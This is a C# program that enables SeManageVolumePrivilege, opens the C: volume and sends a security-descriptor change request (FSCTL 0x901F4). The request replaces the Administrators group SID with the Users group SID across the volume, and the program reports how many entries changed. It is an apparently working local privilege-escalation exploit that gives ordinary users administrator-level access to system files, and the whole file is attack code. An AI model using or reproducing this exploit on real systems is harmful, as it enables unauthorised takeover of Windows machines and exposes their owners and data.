using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(IntPtr ProcessHandle, int DesiredAccess, out IntPtr TokenHandle);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, int BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();
    
    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern bool ConvertStringSidToSid(string StringSid, out IntPtr Sid);
    
    [DllImport("advapi32.dll")]
    static extern uint GetLengthSid(IntPtr pSid);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
    
    // Updated signature: OutputBuffer is now an IntPtr
    [DllImport("ntdll.dll")]
    static extern int NtFsControlFile(IntPtr FileHandle, IntPtr Event, IntPtr ApcRoutine, IntPtr ApcContext, out IO_STATUS_BLOCK IoStatusBlock, uint FsControlCode, IntPtr InputBuffer, uint InputBufferLength, IntPtr OutputBuffer, uint OutputBufferLength);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr LocalFree(IntPtr hMem);

    [StructLayout(LayoutKind.Sequential)] struct LUID { public uint LowPart; public int HighPart; }
    [StructLayout(LayoutKind.Sequential)] struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }
    [StructLayout(LayoutKind.Sequential)] struct TOKEN_PRIVILEGES { public uint PrivilegeCount; public LUID_AND_ATTRIBUTES Privileges; }
    [StructLayout(LayoutKind.Sequential)] struct IO_STATUS_BLOCK { public IntPtr Status; public IntPtr Information; }

    static uint QuadAlign(uint p) 
    { 
        return (p + 7) & 0xFFFFFFF8; 
    }

    static void Main()
    {
        // Step 1: Enable Privilege
        IntPtr hToken;
        OpenProcessToken(GetCurrentProcess(), 0x0020 | 0x0008, out hToken);
        
        LUID luid;
        LookupPrivilegeValue(null, "SeManageVolumePrivilege", out luid);
        
        TOKEN_PRIVILEGES tkp = new TOKEN_PRIVILEGES();
        tkp.PrivilegeCount = 1;
        tkp.Privileges = new LUID_AND_ATTRIBUTES();
        tkp.Privileges.Luid = luid;
        tkp.Privileges.Attributes = 2;
        
        AdjustTokenPrivileges(hToken, false, ref tkp, 0, IntPtr.Zero, IntPtr.Zero);

        // Step 2: Convert SIDs
        IntPtr pOldSid;
        ConvertStringSidToSid("S-1-5-32-544", out pOldSid);
        
        IntPtr pNewSid;
        ConvertStringSidToSid("S-1-5-32-545", out pNewSid);
        
        uint oldSidLen = GetLengthSid(pOldSid);
        uint newSidLen = GetLengthSid(pNewSid);

        // Step 3: Build Memory Payload
        uint headerSize = 16; 
        uint offsetOld = headerSize;
        uint offsetNew = offsetOld + QuadAlign(oldSidLen);
        uint inputSize = offsetNew + QuadAlign(newSidLen);

        IntPtr pSdInput = Marshal.AllocHGlobal((int)inputSize);
        byte[] zeroBytes = new byte[inputSize];
        Marshal.Copy(zeroBytes, 0, pSdInput, (int)inputSize); 

        Marshal.WriteInt32(pSdInput, 0, 0); 
        Marshal.WriteInt32(pSdInput, 4, 1); 
        Marshal.WriteInt16(pSdInput, 8, (short)offsetOld);
        Marshal.WriteInt16(pSdInput, 10, (short)oldSidLen);
        Marshal.WriteInt16(pSdInput, 12, (short)offsetNew);
        Marshal.WriteInt16(pSdInput, 14, (short)newSidLen);

        byte[] oldBytes = new byte[oldSidLen];
        Marshal.Copy(pOldSid, oldBytes, 0, (int)oldSidLen);
        Marshal.Copy(oldBytes, 0, IntPtr.Add(pSdInput, (int)offsetOld), (int)oldSidLen);

        byte[] newBytes = new byte[newSidLen];
        Marshal.Copy(pNewSid, newBytes, 0, (int)newSidLen);
        Marshal.Copy(newBytes, 0, IntPtr.Add(pSdInput, (int)offsetNew), (int)newSidLen);

        // Step 4: Open Volume
        IntPtr hVolume = CreateFile(@"\\.\C:", 0x00100000 | 0x00000020, 1 | 2, IntPtr.Zero, 3, 0x80, IntPtr.Zero);

        // Step 5: Send FSCTL with Oversized Unmanaged Output Buffer
        IntPtr pSdOutput = Marshal.AllocHGlobal(64); 
        IO_STATUS_BLOCK ioStatus;

        int status = NtFsControlFile(hVolume, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, out ioStatus, 0x000901F4, pSdInput, inputSize, pSdOutput, 64);

        if (status != 0) 
        {
            Console.WriteLine(string.Format("ERROR: {0:X}", status));
        }
        else 
        {
            // Read 64-bit integer at offset 8 (NumSDChangedSuccess)
            long successCount = Marshal.ReadInt64(pSdOutput, 8);
            Console.WriteLine(string.Format("Entries changed: {0}", successCount));
        }

        Marshal.FreeHGlobal(pSdInput);
        Marshal.FreeHGlobal(pSdOutput);
        LocalFree(pOldSid);
        LocalFree(pNewSid);
    }
}
